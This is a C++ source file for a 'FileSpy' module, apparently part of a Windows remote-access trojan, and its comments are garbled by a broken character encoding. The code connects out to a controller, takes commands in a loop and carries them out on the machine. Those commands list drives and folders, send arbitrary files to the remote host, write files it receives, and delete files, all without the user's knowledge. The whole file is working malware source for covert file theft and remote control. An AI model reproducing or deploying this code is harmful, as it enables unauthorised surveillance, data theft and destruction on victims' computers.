#include "FileSpy.h"

// ��ʼ��FileSpy
static FileSpy gSpy;

FileSpy::FileSpy()
{
    //
}

void FileSpy::startByNewThread(std::string domain, int port)
{
    // �������Ͷ˿�����ת����һ���ַ�ָ������
    char* args = new char[MAX_PATH + sizeof(int)];
    domain.reserve(MAX_PATH);
    memcpy(args, domain.data(), MAX_PATH);
    memcpy(args + MAX_PATH, (char*)&port, sizeof(int));

    // �������߳�
    HANDLE h = CreateThread(NULL, 0, FileSpy::fileSpyThreadProc, (LPVOID)args, 0, NULL);
    if (!h) 
    {
        std::cout << "Failed to create new thread" << std::endl;
        std::fflush(stdout);
    }
}

DWORD FileSpy::fileSpyThreadProc(LPVOID args)
{
    char domain[MAX_PATH];
    memcpy(domain, args, MAX_PATH);
    int port = *((int*)((char*)args + MAX_PATH));

    // ��ʼ���
    startFileSpy(domain, port);

    // �ͷŲ���
    delete (char*)args;
    return true;
}

void FileSpy::startFileSpy(std::string domain, int port)
{
    // ���ӵ������������շ�������ָ��
    TcpSocket sock;
    if (!sock.connectTo(domain, port)) {
        std::cout << "Failed to connect server for file spy" << std::endl;
        std::fflush(stdout);
    }

    // ��ѭ�������ϴӷ���˽�������
    const int packetSize = 800;
    char szData[packetSize];
    int ret;
    std::string buf;

    while (1) {
        ret = sock.recvData(szData, packetSize);

        // ���ִ���
        if (ret == SOCKET_ERROR || ret == 0) {
            break;
        }

        // �����ݼ��뵽������
        addDataToBuffer(&sock, buf, szData, ret);
    }
}

void FileSpy::addDataToBuffer(TcpSocket* sock, std::string& buf, char* data, int size)
{
    buf.append(data, size);

    // ������ת����ָ��ģʽ
    int endIndex;
    while ((endIndex = buf.find(gSpy.CmdEnd)) >= 0) {
        std::string line = buf.substr(0, endIndex);
        buf.erase(0, endIndex + gSpy.CmdEnd.length());

        // ��ȡָ��
        int firstSplit = line.find(gSpy.CmdSplit);
        std::string cmd = line.substr(0, firstSplit);
        line.erase(0, firstSplit + gSpy.CmdSplit.length());

        // ����ָ��
        processCmd(sock, cmd, line);
    }
}

std::map<std::string, std::string> FileSpy::parseArgs(std::string& data)
{
    // �ַ����ָ���б�
    std::vector<std::string> v;
    std::string::size_type pos1, pos2;
    pos2 = data.find(gSpy.CmdSplit);
    pos1 = 0;
    while (std::string::npos != pos2) {
        v.push_back(data.substr(pos1, pos2 - pos1));
        pos1 = pos2 + gSpy.CmdSplit.size();
        pos2 = data.find(gSpy.CmdSplit, pos1);
    }
    if (pos1 != data.length()) v.push_back(data.substr(pos1));

    // ��������
    std::map<std::string, std::string> args;
    for (int i = 0; i < (int)v.size() - 1; i += 2) {
        args[v.at(i)] = v.at(i + 1);
    }

    return args;
}

void FileSpy::processCmd(TcpSocket* sock, std::string& cmd, std::string& data)
{
    // ��������
    std::map<std::string, std::string> args = parseArgs(data);

    // ��ȡ�ļ�
    if (cmd == gSpy.CmdGetDirFiles) {
        doGetDirFiles(sock, args);
        return;
    }

    // �����ļ�
    if (cmd == gSpy.CmdDownloadFile) {
        doDownloadFile(sock, args);
        return;
    }

    // �ϴ��ļ�
    if (cmd == gSpy.CmdUploadFile) {
        doUploadFile(sock, args);
        return;
    }

    // ɾ���ļ�
    if (cmd == gSpy.CmdDeleteFile) {
        doDeleteFile(sock, args);
        return;
    }
}

void FileSpy::doGetDirFiles(TcpSocket* sock, std::map<std::string, std::string>& args)
{
    std::string dir = args["DIR"];
    std::string data;

    // ���Ϊ�վʹ����ȡ�̷�
    if (dir.size() == 0) {
        std::vector<std::string> drives;
        drives = getDrives();

        // ���̷����������
        data.append(gSpy.CmdSendDrives + gSpy.CmdSplit);
        data.append("DRIVES" + gSpy.CmdSplit);

        int max = drives.size();
        for (int i = 0; i < max; ++i) {
            data.append(drives[i] + gSpy.CmdFileSplit);
        }
        if (drives.size() > 0) {
            data.erase(data.size() - 1);
        }
        data.append(gSpy.CmdEnd);

        // ����
        sock->sendData(data.data(), data.size());
    }
    else {
        std::vector<std::string> files;
        std::vector<std::string> dirs;

        dirs = getDirs(dir);
        files = getFiles(dir);

        // ��Ŀ¼���������
        data.append(gSpy.CmdSendDirs + gSpy.CmdSplit);
        data.append("DIR" + gSpy.CmdSplit + dir + gSpy.CmdSplit);
        data.append("DIRS" + gSpy.CmdSplit);

        int max = dirs.size();
        for (int i = 0; i < max; ++i) {
            data.append(dirs[i] + gSpy.CmdFileSplit);
        }
        if (dirs.size() > 0) {
            data.erase(data.size() - 1);
        }
        data.append(gSpy.CmdEnd);

        // ���ļ������������
        data.append(gSpy.CmdSendFiles + gSpy.CmdSplit);
        data.append("DIR" + gSpy.CmdSplit + dir + gSpy.CmdSplit);
        data.append("FILES" + gSpy.CmdSplit);

        max = files.size();
        for (int i = 0; i < max; ++i) {
            data.append(files[i] + gSpy.CmdFileSplit);
        }
        if (files.size()) {
            data.erase(data.size() - 1);
        }
        data.append(gSpy.CmdEnd);

        // ����
        sock->sendData(data.data(), data.size());
    }

}

void FileSpy::doDownloadFile(TcpSocket* sock, std::map<std::string, std::string>& args)
{
    // �����ļ��������
    std::string filePath = args["FILE_PATH"];
    int port = atoi(args["PORT"].data());

    // ����һ���µ��̷߳����ļ�
    startSendFileByNewThread(filePath, sock->mIp, port);
}

void FileSpy::doUploadFile(TcpSocket* sock, std::map<std::string, std::string>& args)
{
    // �ӷ���˽����ļ�
    std::string filePath = args["FILE_PATH"];
    int port = atoi(args["PORT"].data());

    // ����һ���߳̽����ļ�
    startRecvFileByNewThread(filePath, sock->mIp, port);
}

void FileSpy::doDeleteFile(TcpSocket* sock, std::map<std::string, std::string>& args)
{
    // ɾ���ļ�
    bool  ret = DeleteFileA(args["FILE_PATH"].data());
    std::string data;
    if (ret) {
        data.append(gSpy.CmdDeleteFileSuccess);
        data.append(gSpy.CmdEnd);
        sock->sendData(data.data(), data.size());
    }
    else {
        data.append(gSpy.CmdDeleteFileFailed);
        data.append(gSpy.CmdEnd);
        sock->sendData(data.data(), data.size());
    }
}

std::vector<std::string> FileSpy::getDrives()
{
    std::vector<std::string> drives;

    // ����a-z�̷�
    for (int i = 'b'; i <= 'z'; i++) {
        char d[MAX_PATH];
        sprintf(d, "%c:\\*", i);

        WIN32_FIND_DATAA findData;
        HANDLE h = FindFirstFileA(d, &findData);
        if (h != INVALID_HANDLE_VALUE) {
            d[strlen(d) - 1] = '\0';
            drives.push_back(d);


             // �ͷž��
             FindClose(h);
        }
    }

    return drives;
}

std::vector<std::string> FileSpy::getDirs(std::string dir)
{
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(dir.append("\\*").data(), &findData);
    std::vector<std::string> files;

    if (hFind == INVALID_HANDLE_VALUE) {
        return files;
    }

    // ����Ŀ¼����ȡ·��
    while (FindNextFileA(hFind, &findData)) {
        // ����Ҫ���˺͵�ǰĿ¼
        if (!strcmp(findData.cFileName, "..") || !strcmp(findData.cFileName, ".")) {
            continue;
        }

        // �ж�·��
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            files.push_back(findData.cFileName);
        }
    }

    // �ͷž��
    FindClose(hFind);

    return files;
}

std::vector<std::string> FileSpy::getFiles(std::string dir)
{
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(dir.append("\\*").data(), &findData);
    std::vector<std::string> files;

    if (hFind == INVALID_HANDLE_VALUE) {
        return files;
    }

    // ����Ŀ¼����ȡ�ļ�
    while (FindNextFileA(hFind, &findData)) {
        // ����Ҫ���˺͵�ǰĿ¼
        if (!strcmp(findData.cFileName, "..") || !strcmp(findData.cFileName, ".")) {
            continue;
        }

        // �жϲ���·��
        if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            files.push_back(findData.cFileName);
        }
    }

    // �ͷž��
    FindClose(hFind);

    return files;
}

void FileSpy::startSendFileByNewThread(std::string filePath, std::string domain, int port)
{
    // ���ļ�·���������Ͷ˿�����ת����һ���ַ�ָ������
    char* args = new char[MAX_PATH + MAX_PATH + sizeof(int)];

    filePath.reserve(MAX_PATH);
    memcpy(args, filePath.data(), MAX_PATH);

    domain.reserve(MAX_PATH);
    memcpy(args + MAX_PATH, domain.data(), MAX_PATH);

    memcpy(args + MAX_PATH + MAX_PATH, (char*)&port, sizeof(int));

    // �������߳�
    HANDLE h = CreateThread(NULL, 0, FileSpy::sendFileThreadProc, (LPVOID)args, 0, NULL);
    if (!h) {
        std::cout << "Failed to create new thread" << std::endl;
        std::fflush(stdout);
    }
}

DWORD FileSpy::sendFileThreadProc(LPVOID args)
{
    // ���ļ�·���������Ͷ˿����ݴ�ָ��ת������
    char filePath[MAX_PATH], domain[MAX_PATH];
    memcpy(filePath, args, MAX_PATH);
    memcpy(domain, (LPVOID)((char*)args + MAX_PATH), MAX_PATH);
    int port = *((int*)((char*)args + MAX_PATH + MAX_PATH));

    // ��ʼ�����ļ�
    startSendFile(filePath, domain, port);

    // �ͷŲ���
    delete (char*)args;
    return true;
}

void FileSpy::startSendFile(std::string filePath, std::string domain, int port)
{
    // ���ӵ�����˷����ļ�
    TcpSocket sock;
    if (!sock.connectTo(domain, port)) {
        std::cout << "Failed to connect server for send file" << std::endl;
        std::fflush(stdout);
        return;
    }

    // ���ļ�
    FILE* fp = fopen(filePath.data(), "rb");
    if (!fp) {
        // �Ͽ�
        sock.dissconnect();

        std::cout << "Failed to open file for send file" << std::endl;
        std::fflush(stdout);
        return;
    }

    // ��ȡ�ļ���С
    fseek(fp, 0, SEEK_END);
    unsigned int len = ftell(fp);
    rewind(fp);

    // ��ȡ�ļ�����
    char name[_MAX_FNAME], ext[_MAX_EXT];
    _splitpath(filePath.data(), NULL, NULL, name, ext);

    // �����ļ�ͷ
    FileHeader header;
    sprintf(header.fileName, "%s%s", name, ext);
    header.len = len;
    sock.sendData((char*)&header, sizeof(header));

    // �����ļ�����
    // ����jpg���ݰ�������Сÿ���������1000�������ﶨ��800
    const unsigned int paketLen = 800;
    char data[800];
    unsigned int pos = 0;

    while (pos < len) {
        int sendSize = (pos + paketLen) > len ? len - pos : paketLen;

        // ��ȡ�ļ�
        fread(data, 1, sendSize, fp);

        if (!sock.sendData(data, sendSize)) {
            return;
        }

        pos += sendSize;
    }

    // �ر��Ѿ��򿪵��ļ�
    fclose(fp);
}

void FileSpy::startRecvFileByNewThread(std::string filePath, std::string domain, int port)
{
    // ���ļ�·���������Ͷ˿�����ת����һ���ַ�ָ������
    char* args = new char[MAX_PATH + MAX_PATH + sizeof(int)];

    filePath.reserve(MAX_PATH);
    memcpy(args, filePath.data(), MAX_PATH);

    domain.reserve(MAX_PATH);
    memcpy(args + MAX_PATH, domain.data(), MAX_PATH);

    memcpy(args + MAX_PATH + MAX_PATH, (char*)&port, sizeof(int));

    // �������߳�
    HANDLE h = CreateThread(NULL, 0, FileSpy::recvFileThreadProc, (LPVOID)args, 0, NULL);
    if (!h) {
        std::cout << "Failed to create new thread" << std::endl;
        std::fflush(stdout);
    }
}

DWORD FileSpy::recvFileThreadProc(LPVOID args)
{
    // ���ļ�·���������Ͷ˿����ݴ�ָ��ת������
    char filePath[MAX_PATH], domain[MAX_PATH];
    memcpy(filePath, args, MAX_PATH);
    memcpy(domain, (LPVOID)((char*)args + MAX_PATH), MAX_PATH);
    int port = *((int*)((char*)args + MAX_PATH + MAX_PATH));

    // ��ʼ����
    startRecvFile(filePath, domain, port);

    // �ͷŲ���
    delete (char*)args;
    return true;
}

void FileSpy::startRecvFile(std::string filePath, std::string domain, int port)
{    // ���ӵ�����˷����ļ�
    TcpSocket sock;
    if (!sock.connectTo(domain, port)) {
        std::cout << "Failed to connect server for send file" << std::endl;
        std::fflush(stdout);
        return;
    }

    // ����һ���µ��ļ�
    FILE* fp = fopen(filePath.data(), "wb");
    if (!fp) {
        // �Ͽ�
        sock.dissconnect();

        std::cout << "Failed to open file for send file" << std::endl;
        std::fflush(stdout);
        return;
    }

    // ��ʼ��������
    const int packetLen = 800;
    char data[packetLen];
    while (1) {
        int ret = sock.recvData(data, packetLen);

        if (ret == SOCKET_ERROR || ret == 0) {
            break;
        }
        std::cout << "uploaded " << packetLen << "bytes success!" << std::endl;
        // д������
        fwrite(data, 1, ret, fp);
    }

    // �ر��ļ�
    if (fp) {
        fclose(fp);
    }
}
